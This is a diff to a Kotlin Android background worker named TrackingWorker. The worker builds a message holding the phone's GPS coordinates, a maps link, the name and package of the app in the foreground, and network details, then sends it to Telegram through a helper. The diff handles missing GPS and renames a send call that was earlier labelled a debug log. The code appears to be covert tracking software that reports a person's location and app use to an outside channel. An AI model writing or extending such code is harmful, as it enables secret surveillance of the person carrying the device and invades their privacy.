@@ -93,7 +93,18 @@ class TrackingWorker(context: Context, params: WorkerParameters) : CoroutineWork
         val sdf = SimpleDateFormat("dd-MMM-yyyy hh:mm a", Locale.getDefault())
         val currentTime = sdf.format(System.currentTimeMillis())
 
-        val mapLink = "https://maps.google.com/?q=${finalLatLon.first},${finalLatLon.second}"
+        val isNullIsland = finalLatLon.first == 0.0 && finalLatLon.second == 0.0
+        val locationTextToDisplay = if (isNullIsland) {
+            "Location: GPS is OFF or Unavailable"
+        } else {
+            "${finalLatLon.first}, ${finalLatLon.second}"
+        }
+
+        val mapSection = if (isNullIsland) {
+            ""
+        } else {
+            "🗺 *Map:* [Open Location in Google Maps](https://maps.google.com/?q=${finalLatLon.first},${finalLatLon.second})"
+        }
 
         val networkData = NetworkLocationUtility.getNetworkLocationInfo(applicationContext)
 
@@ -102,15 +113,16 @@ class TrackingWorker(context: Context, params: WorkerParameters) : CoroutineWork
 
             ⏱ *Time:* $currentTime
 
-            📍 *Location:* $locationText
-            🗺 *Map:* [Open Location in Google Maps]($mapLink)
+            📍 *Location:* $locationTextToDisplay
+            $mapSection
 
             📱 *App Opened:* $realAppName
             📦 *Package:* $actualForegroundApp
+
             📡 *Network Info:* $networkData
         """.trimIndent()
 
-        TelegramSyncHelper.sendDebugLog(applicationContext, finalLatLon.first.toString(), finalLatLon.second.toString(), myLog)
+        TelegramSyncHelper.sendLogData(myLog)
 
         return Result.success()
     }
